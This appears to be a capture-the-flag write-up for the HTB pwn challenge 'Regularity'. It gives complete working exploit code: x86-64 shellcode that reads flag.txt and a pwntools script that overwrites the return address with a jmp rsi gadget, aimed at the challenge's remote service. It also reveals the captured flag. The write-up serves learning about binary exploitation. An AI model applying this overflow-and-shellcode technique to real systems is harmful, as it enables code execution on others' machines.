---
title: "HTB Cyber Apocalypse: Regularity"
description: "Writeup for a pwn challenge using a direct RIP overwrite, a `jmp rsi` pivot, and position-independent shellcode to print `flag.txt`."
slug: htb-regularity
date: 2026-02-10 14:18:00+0300
competition: "HTB Cyber Apocalypse"
categories:
    - Binary Exploitation
tags:
    - htb
    - pwn
    - shellcode
    - x86-64
---

## Challenge

`Regularity` was a terminal pwn task running on `154.57.164.80:30663`. The local files contained a single static 64-bit ELF named `regularity`, and the final solve script was preserved with the challenge files.

Scenario prompt:

> Nothing much changes from day to day. Famine, conflict, hatred - it's all part and parcel of the lives we live now. We've grown used to the animosity that we experience every day, and that's why it's so nice to have a useful program that asks how I'm doing.

## Binary Notes

The local artifact identified as:

```text
ELF 64-bit LSB executable, x86-64, statically linked, not stripped
```

The solve path did not need libc. A straight control-flow pivot into attacker-controlled shellcode was enough.

## Exploit Idea

The service accepted attacker-controlled bytes and the final solve used a `jmp rsi` gadget at `0x401041`. That meant the practical plan was:

1. Place shellcode at the start of the input buffer.
2. Pad to the saved return address.
3. Overwrite RIP with `jmp rsi`.
4. Let execution jump back into the shellcode already sitting in memory.

Instead of spawning a shell, I used shellcode that opened `flag.txt`, read it, and wrote the contents to stdout. That avoided any TTY issues on the remote service.

## Shellcode

The archived solve used Keystone to assemble the payload:

```python
from keystone import Ks, KS_ARCH_X86, KS_MODE_64

ks = Ks(KS_ARCH_X86, KS_MODE_64)
asm_code = r'''
    sub rsp, 0x200

    xor eax, eax
    mov rbx, 0x7478742e67616c66
    push rax
    push rbx

    mov rdi, rsp
    xor esi, esi
    xor edx, edx
    mov al, 2
    syscall

    mov rdi, rax
    lea rsi, [rsp+0x20]
    mov edx, 0x100
    xor eax, eax
    syscall

    mov rdx, rax
    mov edi, 1
    mov eax, 1
    syscall

    xor edi, edi
    mov eax, 60
    syscall
'''

shellcode = bytes(ks.asm(asm_code)[0])
```

The first `mov rbx, 0x7478742e67616c66` pushes the string `flag.txt` onto the stack in little-endian form, then the shellcode performs:

- `open("flag.txt", 0, 0)`
- `read(fd, buf, 0x100)`
- `write(1, buf, n)`
- `exit(0)`

## Final Payload

The solve script padded the shellcode to `0x100` bytes, then overwrote RIP with the pivot gadget:

```python
from pwn import *

HOST = "154.57.164.80"
PORT = 30663
JMP_RSI = 0x401041

payload = shellcode.ljust(0x100, b"\x90") + p64(JMP_RSI) + b"B" * 8

io = remote(HOST, PORT)
io.recvuntil(b"?")
io.send(payload)
print(io.recvall().decode(errors="ignore"))
```

## Final Result

Flag:

```text
HTB{juMp1nG_w1tH_tH3_r3gIsT3rS?_5fa4381e71122173b2457f32a4da6776}
```

## Notes

- Static linkage removed the need for a libc leak.
- Returning into `jmp rsi` was simpler than building a full ROP chain.
- Printing the flag directly from shellcode is often the most reliable finish for tiny remote services.
